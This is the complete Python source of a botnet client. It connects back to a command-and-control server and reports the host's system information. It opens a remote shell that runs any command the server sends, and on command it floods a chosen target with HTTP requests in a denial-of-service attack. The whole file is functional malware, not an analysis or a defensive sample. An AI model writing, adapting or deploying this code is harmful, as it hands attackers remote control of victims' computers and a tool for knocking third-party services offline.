import socket
import subprocess
import sys
import os
import platform
import time
import uuid
import threading


OS=platform.system()
SERVER_IP="127.0.0.1"
SERVER_PORT=9090
BUFFER=10240
UUID=uuid.uuid4()
RETRY=True
DDosing=True

def DDoS(TARGETINFO):
	global DDoSing
	TARGET=TARGETINFO.split(" ")
	TARGETIP=TARGET[1]
	TARGETIP=TARGETIP.split(":")
	FAKEIP=TARGET[2]
	FAKEIP=FAKEIP.split(":")
	print(FAKEIP,"   ",TARGETIP)
	while DDoSing:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((TARGETIP[0], int(TARGETIP[1])))
			s.sendto(("GET /" + TARGETIP[0] + " HTTP/1.1\r\n").encode('ascii'), (TARGETIP[0], int(TARGETIP[1])))
			s.sendto(("Host: " + FAKEIP[0] + "\r\n\r\n").encode('ascii'), (TARGETIP[0], int(TARGETIP[1])))
			s.close()
		except Exception as Exec:
			print("[BOT | Critical] DDoS Failed",Exec)
			DDoSing=False

def main():
	global DDoSing,sock
	while True:
		try:
			COMM_RECV=sock.recv(BUFFER)
			COMM_RECV=COMM_RECV.decode()
			print("RECV: ",COMM_RECV)
			if COMM_RECV=='pingbot':
				sock.send(str.encode("BOT ONLINE"))
				print("SENT: ","BOT ONLINE")
			elif COMM_RECV=="shell":
				sock.send(str.encode("[Client] Shell Connected!\n"+str(os.getcwd()) + '> '))
				while True:
					try:
						COMM_RECV=sock.recv(BUFFER)
						COMM_RECV=COMM_RECV.decode()
						if COMM_RECV!="":
							print(COMM_RECV)
							if COMM_RECV=='exit':
								sock.send(str.encode("[Client] Closing Shell"))
								break
							if COMM_RECV[:2] == 'cd':
								try:
									os.chdir(COMM_RECV[3:])
								except:
									pass
							if COMM_RECV=='Request current path':
								sock.send(str.encode(str(os.getcwd()) + '> '))
							else:
								COMM_SEND = subprocess.Popen(COMM_RECV[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
								OUTPUT = COMM_SEND.stdout.read()
								OUTPUT = str(OUTPUT, "utf-8")
								sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
						else:
							OUTPUT="No output"
							sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
					except:
						raise TimeoutError
			elif COMM_RECV[:4]=="ddos":
				sock.send(str.encode("DDoS Initialising!"))
				DDoSing=True
				DDOSTHREAD=threading.Thread(target=DDoS,args=[COMM_RECV[4:],])
				DDOSTHREAD.start()
			elif COMM_RECV=="kill ddos":
				sock.send(str.encode("Killing DDoS"))
				DDoSing=False
			elif COMM_RECV=='exit':
				sock.send(str.encode("[Client] Self Destruct Initiated!"))
				try:
					sock.close()
				except:
					pass
				break
			else:
				sock.send(str.encode("Unknown Command!"))
				print("SENT: ","Unknown Command!")
		except:
			sock.close()
			connected=False
			while not connected:
				try:
					sock=socket.socket()
					sock.connect((SERVER_IP,SERVER_PORT))
					connected=True
					try:
						if OS=="Windows":
							ACK=subprocess.getoutput("systeminfo")
						elif OS=="Darwin":
							ACK=subprocess.getoutput("system_profiler")
						else:
							ACK=subprocess.getoutput("uname -a")
						ACK+="\n"
						ACK="UUID: "+str(UUID)+"\n"+ACK
						sock.send(str.encode(ACK))
						if sock.recv(BUFFER).decode()=="Received":
							print("Connected")
							connected=True
					except Exception as Errored:
						print("Error Here1", Errored)
						
				except:
					connected=False
	print("Exiting")
	connected=False
	exit()


def ACK():
	global sock
	try:
		if OS=="Windows":
			ACK=subprocess.getoutput("systeminfo")
		elif OS=="Darwin":
			ACK=subprocess.getoutput("system_profiler")
		else:
			ACK=subprocess.getoutput("uname -a")
		ACK+="\n"
		ACK="UUID: "+str(UUID)+"\n"+ACK
		sock.send(str.encode(ACK))
		if sock.recv(BUFFER).decode()=="Received":
			main()
	except Exception as Errored:
		print("Error Here3", Errored)

connected=False
while not connected:
	try:
		sock=socket.socket()
		sock.connect((SERVER_IP,SERVER_PORT))
		print("Connected")
		connected=True
	except Exception as Exp:
		print("Discon:", Exp)
		sock.close()
		pass
ACK()	
		

